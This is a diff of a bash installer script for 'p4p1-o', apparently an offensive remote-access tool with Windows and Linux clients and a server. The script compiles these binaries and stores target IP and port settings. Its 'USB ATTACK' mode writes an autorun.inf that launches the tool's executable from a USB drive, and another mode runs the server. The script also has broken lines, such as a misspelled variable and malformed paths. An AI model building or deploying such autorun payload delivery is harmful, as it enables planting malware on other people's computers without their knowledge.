@@ -7,12 +7,16 @@
 # * |_|       |_|
 # ***********************
 #
+# this file is an installation program
+# and setup all cfg files.
 # User guide to use p4p1-o
 # ./p4p1-o_UserGuide
 
 E_NOINSTALL=40
 E_EXEMISS=41
 E_NOCHOICE=42
+E_MAKE=43
+E_NOCOMP=44
 HOME_PATH=~/.p4p1-o/
 CONF_PATH=~/.p4p1-o/cfg/
 EXE_PATH=~/.p4p1-o/exe/
@@ -21,10 +25,16 @@ UN_FILE=~/.p4p1-o/cfg/un.cfg
 PORT_FILE=~/.p4p1-o/cfg/port.cfg
 IP_FILE=~/.p4p1-o/cfg/ip.cfg
 AUTORUN=autorun.inf
+MAKENAMEW32C=p4p1-o_32_Vx.exe
+MAKENAMEW64C=p4p1-o_64_Vx.exe
+MAKENAMELC=p4p1-o_Vx
+MAKENAMELS=p4p1-s_Vx
 W32EXE_PATH="~/.p4p1-o/exe/p4p1-o_32_V9.exe"
 W64EXE_PATH="~/.p4p1-o/exe/p4p1-o_64_V9.exe"
+W32EXE=p4p1-o_32_V9.exe
+W64EXE=p4p1-o_64_V9.exe
 EXT_IP=`dig +short myip.opendns.com @resolver1.opendns.com`
-UN=`cat $UN_FILE`
+UN=`cat ~/.p4p1-o/cfg/un.cfg`
 
 
 echo "*       _ _       _"
@@ -35,6 +45,15 @@ echo "* |_|       |_|"
 echo "*********welcome*********"
 
 if [ ! -d "$HOME_PATH" ]; then
+
+	echo "[*] Enter Current Version."
+	read VERSION
+
+	if [ ! -e "p4p1-s_V$VERSION" ]; then
+		echo "[!] Please compile first"
+		echo "[!] ./p4p1-o_UserGuide -c"
+		exit E_NOCOMP
+	fi
 
 	echo "[*] First execution do you want to install?? (yes/no)"
 	read q
@@ -54,6 +73,7 @@ if [ ! -d "$HOME_PATH" ]; then
 
 	if [[ ! -e "$W32EXE" && ! -e "$W64EXE" ]]; then
 		echo "[!] missing executables"
+		rm -rf ~/.p4p1-o/
 		exit $E_EXEMISS
 	fi
 
@@ -80,41 +100,97 @@ if [ ! -d "$HOME_PATH" ]; then
 	echo "[*] Instalation finished thank you for using :)"
 
 else
-	echo "[*] Hy $UN."
-	echo "[*] Welcome to p4p1-o, This program was made by p4p1."
-	echo "[*] You have 2 modes please choose wich oen you want to use."
-	echo "[1] USB ATTACK"
-	echo "[2] I WILL FIGURE MY ATTACK MYSELF JUST CP THE EXE TO THE DESKTOP"
-	read q
-	if [ "$q" = "1" ]; then
-		echo "[*] Please enter the usb path"
-		read USB_PATH
-		echo "[autorun]" > $AUTORUN
-		echo "[*] is it a 32 bit or 64 bit?"
-		read q
 
-		cd $USB_PATH
+	if [ "$1" = "-c" ]; then
 
-		if [ "$q" = "32" ];then
-			cp -v $W32EXE_PATH .
-			echo "open=$W32EXE" >> $AUTORUN
-		else
-			cp -v $W64EXE_PATH .
-			echo "open=$W64EXE" >> $AUTORUN
+		if [ ! -e "Makefile" ]; then
+			echo "[!] Error no makefile found!"
+			exit $E_MAKE
 		fi
 
-		echo "action=Start ShellRun-CD" >> $AUTORUN
-		echo "[*] Created autorun"
-		cp -v $AUTORUN .
-		echo "[*] Copied to file with exe and done!"
+		echo "[*] Please enter  p4p1 version"
+		read VERSION
+		echo "[*] Making p4p1 version $VERSION for windows"
+		make windows
 
-	elif [ "$q" = "2" ]; then
-		echo "[*] Retreiving files ..."
-		cd $EXE_PATH
-		cp -v $W32EXE $DESKTOP_PATH
-		cp -v $W64EXEx $DESKTOP_PATH
+		if [ "$?" = "2" ]; then
+			echo "[!] Please download mingw"
+			echo "[*] The program will compile the linux client and server version $VERSION"
+			echo "[*] Press enter to continue"
+			read
+			make linux
+
+			mv -v $MAKENAMELC p4p1-o_V$VERSION
+			mv -v $MAKENAMELS p4p1-s_V$VERSION
+		else
+			mv -v $MAKENAMEW32C p4p1-o_32_V$VERSION.exe
+			mv -v $MAKENAMEW64C p4p1-o_64_V$VERSION.exe
+			echo "[*] Making p4p1 version $VERSION for linux"
+			make linux
+
+			mv -v $MAKENAMELC p4p1-o_V$VERSION
+			mv -v $MAKENAMELS p4p1-s_V$VERSION
+		fi
+
+		echo "[*] Compiled all of the p4p1-o and p4p1-s files."
+
+	elif [ "$1" = "mrproper" ]; then
+
+		echo "[*] Cleaning all of the p4p1 versions"
+		mv -v p4p1-o_V* version/
+		mv -v p4p1-s_V* version/
+		echo "[*] Done."
+
 	else
-		echo "[!] Wrong choice"
-		exit $E_NOCHOICE
+
+		echo "[*] Hy $UN."
+		echo "[*] Welcome to p4p1-o, This program was made by p4p1."
+		echo "[*] You have 2 modes please choose wich oen you want to use."
+		echo "[1] USB ATTACK"
+		echo "[2] I WILL FIGURE MY ATTACK MYSELF JUST CP THE EXE TO THE DESKTOP"
+		echo "[3] EXECUTE SERVER"
+		read q
+
+		if [ "$q" = "1" ]; then
+
+			echo "[*] Please enter the usb path"
+			read USB_PATH
+			echo "[autorun]" > $AUTORUN
+			echo "[*] is it a 32 bit or 64 bit?"
+			read q
+
+			cd $USB_PATH
+
+			if [ "$q" = "32" ];then
+				cp -v $W32EXE_PATH .
+				echo "open=$W32EXE" >> $AUTORUN
+			else
+				cp -v $W64EXE_PATH .
+				echo "open=$W64EXE" >> $AUTORUN
+			fi
+
+			echo "action=Start ShellRun-CD" >> $AUTORUN
+			echo "[*] Created autorun"
+			cp -v $AUTORUN .
+			echo "[*] Copied to file with exe and done!"
+
+		elif [ "$q" = "2" ]; then
+
+			echo "[*] Retreiving files ..."
+			cd $EXE_PATH
+			cp -v $W32EXE $DESKTOP_PATH
+			cp -v $W64EXEx $DESKTOP_PATH
+
+		elif [ "$q" = "3" ]; then
+
+			echo "[*] Running Server..."
+			./~/.p4p1-o/p4p1-s_V*
+
+		else
+
+			echo "[!] Wrong choice"
+			exit $E_NOCHOICE
+
+		fi
 	fi
 fi
